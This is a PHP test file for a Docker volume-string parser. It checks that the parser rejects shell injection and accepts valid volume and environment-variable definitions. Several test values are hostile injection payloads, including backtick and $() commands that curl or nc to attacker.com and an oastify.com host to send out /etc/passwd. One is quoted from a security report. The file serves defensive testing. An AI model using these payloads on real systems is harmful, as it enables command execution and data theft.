<?php

test('parseDockerVolumeString rejects command injection in source path', function () {
    $maliciousVolume = '/tmp/pwn`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`:/app';

    expect(fn () => parseDockerVolumeString($maliciousVolume))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('parseDockerVolumeString rejects backtick injection', function () {
    $maliciousVolumes = [
        '`whoami`:/app',
        '/tmp/evil`id`:/data',
        './data`nc attacker.com 1234`:/app/data',
    ];

    foreach ($maliciousVolumes as $volume) {
        expect(fn () => parseDockerVolumeString($volume))
            ->toThrow(Exception::class);
    }
});

test('parseDockerVolumeString rejects dollar-paren injection', function () {
    $maliciousVolumes = [
        '$(whoami):/app',
        '/tmp/evil$(cat /etc/passwd):/data',
        './data$(curl attacker.com):/app/data',
    ];

    foreach ($maliciousVolumes as $volume) {
        expect(fn () => parseDockerVolumeString($volume))
            ->toThrow(Exception::class);
    }
});

test('parseDockerVolumeString rejects pipe injection', function () {
    $maliciousVolume = '/tmp/file | nc attacker.com 1234:/app';

    expect(fn () => parseDockerVolumeString($maliciousVolume))
        ->toThrow(Exception::class);
});

test('parseDockerVolumeString rejects semicolon injection', function () {
    $maliciousVolume = '/tmp/file; curl attacker.com:/app';

    expect(fn () => parseDockerVolumeString($maliciousVolume))
        ->toThrow(Exception::class);
});

test('parseDockerVolumeString rejects ampersand injection', function () {
    $maliciousVolumes = [
        '/tmp/file & curl attacker.com:/app',
        '/tmp/file && curl attacker.com:/app',
    ];

    foreach ($maliciousVolumes as $volume) {
        expect(fn () => parseDockerVolumeString($volume))
            ->toThrow(Exception::class);
    }
});

test('parseDockerVolumeString accepts legitimate volume definitions', function () {
    $legitimateVolumes = [
        'gitea:/data',
        './data:/app/data',
        '/var/lib/data:/data',
        '/etc/localtime:/etc/localtime:ro',
        'my-app_data:/var/lib/app-data',
        'C:/Windows/Data:/data',
        '/path-with-dashes:/app',
        '/path_with_underscores:/app',
        'volume.with.dots:/data',
    ];

    foreach ($legitimateVolumes as $volume) {
        $result = parseDockerVolumeString($volume);
        expect($result)->toBeArray();
        expect($result)->toHaveKey('source');
        expect($result)->toHaveKey('target');
    }
});

test('parseDockerVolumeString accepts simple environment variables', function () {
    $volumes = [
        '${DATA_PATH}:/data',
        '${VOLUME_PATH}:/app',
        '${MY_VAR_123}:/var/lib/data',
    ];

    foreach ($volumes as $volume) {
        $result = parseDockerVolumeString($volume);
        expect($result)->toBeArray();
        expect($result['source'])->not->toBeNull();
    }
});

test('parseDockerVolumeString accepts environment variables with path concatenation', function () {
    $volumes = [
        '${VOLUMES_PATH}/mysql:/var/lib/mysql',
        '${DATA_PATH}/config:/etc/config',
        '${VOLUME_PATH}/app_data:/app',
        '${MY_VAR_123}/deep/nested/path:/data',
        '${VAR}/path:/app',
        '${VAR}_suffix:/app',
        '${VAR}-suffix:/app',
        '${VAR}.ext:/app',
        '${VOLUMES_PATH}/mysql:/var/lib/mysql:ro',
        '${DATA_PATH}/config:/etc/config:rw',
    ];

    foreach ($volumes as $volume) {
        $result = parseDockerVolumeString($volume);
        expect($result)->toBeArray();
        expect($result['source'])->not->toBeNull();
    }
});

test('parseDockerVolumeString rejects environment variables with command injection in default', function () {
    $maliciousVolumes = [
        '${VAR:-`whoami`}:/app',
        '${VAR:-$(cat /etc/passwd)}:/data',
        '${PATH:-/tmp;curl attacker.com}:/app',
    ];

    foreach ($maliciousVolumes as $volume) {
        expect(fn () => parseDockerVolumeString($volume))
            ->toThrow(Exception::class);
    }
});

test('parseDockerVolumeString accepts environment variables with safe defaults', function () {
    $safeVolumes = [
        '${VOLUME_DB_PATH:-db}:/data/db',
        '${DATA_PATH:-./data}:/app/data',
        '${VOLUME_PATH:-/var/lib/data}:/data',
    ];

    foreach ($safeVolumes as $volume) {
        $result = parseDockerVolumeString($volume);
        expect($result)->toBeArray();
        expect($result['source'])->not->toBeNull();
    }
});

test('parseDockerVolumeString rejects injection in target path', function () {
    // While target paths are less dangerous, we should still validate them
    $maliciousVolumes = [
        '/data:/app`whoami`',
        './data:/tmp/evil$(id)',
        'volume:/data; curl attacker.com',
    ];

    foreach ($maliciousVolumes as $volume) {
        expect(fn () => parseDockerVolumeString($volume))
            ->toThrow(Exception::class);
    }
});

test('parseDockerVolumeString rejects the exact example from the security report', function () {
    $exactMaliciousVolume = '/tmp/pwn`curl https://78dllxcupr3aicoacj8k7ab8jzpqdt1i.oastify.com -X POST --data "$(cat /etc/passwd)"`:/app';

    expect(fn () => parseDockerVolumeString($exactMaliciousVolume))
        ->toThrow(Exception::class, 'Invalid Docker volume definition');
});

test('parseDockerVolumeString provides helpful error messages', function () {
    $maliciousVolume = '/tmp/evil`command`:/app';

    try {
        parseDockerVolumeString($maliciousVolume);
        expect(false)->toBeTrue('Should have thrown exception');
    } catch (Exception $e) {
        expect($e->getMessage())->toContain('Invalid Docker volume definition');
        expect($e->getMessage())->toContain('backtick');
        expect($e->getMessage())->toContain('volume source');
    }
});

test('parseDockerVolumeString handles whitespace with malicious content', function () {
    $maliciousVolume = '  /tmp/evil`whoami`:/app  ';

    expect(fn () => parseDockerVolumeString($maliciousVolume))
        ->toThrow(Exception::class);
});

test('parseDockerVolumeString rejects redirection operators', function () {
    $maliciousVolumes = [
        '/tmp/file > /dev/null:/app',
        '/tmp/file < input.txt:/app',
        './data >> output.log:/app',
    ];

    foreach ($maliciousVolumes as $volume) {
        expect(fn () => parseDockerVolumeString($volume))
            ->toThrow(Exception::class);
    }
});

test('parseDockerVolumeString rejects newline and tab in volume strings', function () {
    // Newline can be used as command separator
    expect(fn () => parseDockerVolumeString("/data\n:/app"))
        ->toThrow(Exception::class);

    // Tab can be used as token separator
    expect(fn () => parseDockerVolumeString("/data\t:/app"))
        ->toThrow(Exception::class);
});
